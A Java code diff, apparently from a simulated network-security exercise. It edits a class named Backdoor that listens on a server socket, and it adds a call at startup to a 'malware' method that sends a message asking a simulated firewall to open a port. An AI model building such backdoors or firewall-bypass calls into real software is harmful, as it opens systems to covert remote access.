@@ -16,7 +16,7 @@ public class Backdoor {
 
     private ServerSocket serverSocket;
 
-    private final int GATEWAY_PORTA = 1042;
+    private final int FIREWALL_PORTA = 10101;
 
     private final List<ClientSocket> USUARIOS = new LinkedList<>();
 
@@ -26,6 +26,7 @@ public class Backdoor {
     public void start() throws IOException {
         serverSocket = new ServerSocket(PORTA);
         System.out.println("Iniciando Backdoor na porta = " + PORTA);
+        malware();
         mainLoop();
     }
 
@@ -35,7 +36,7 @@ public class Backdoor {
             USUARIOS.add(clientSocket);
             new Thread(() -> {
                 try {
-                    bacldoorLoop(clientSocket);
+                    backdoorLoop(clientSocket);
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -43,7 +44,7 @@ public class Backdoor {
         }
     }
 
-    private void bacldoorLoop(ClientSocket clientSocket) throws IOException {
+    private void backdoorLoop(ClientSocket clientSocket) throws IOException {
         String mensagem;
         try {
             while ((mensagem = clientSocket.getMessage()) != null) {
@@ -55,11 +56,11 @@ public class Backdoor {
     }
 
     private void malware(){
-        ClientSocket sendGateway;
+        ClientSocket sendFirewall;
         try {
-            sendGateway = new ClientSocket(new Socket("localhost", GATEWAY_PORTA));
-            sendGateway.sendMessage("autenticar;cliente;" + true + ";1;" + 42);
-            sendGateway.close();
+            sendFirewall = new ClientSocket(new Socket(ENDERECO_SERVER, FIREWALL_PORTA));
+            sendFirewall.sendMessage(ENDERECO_SERVER + ";" + 1048 + ";" + 1048);
+            sendFirewall.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
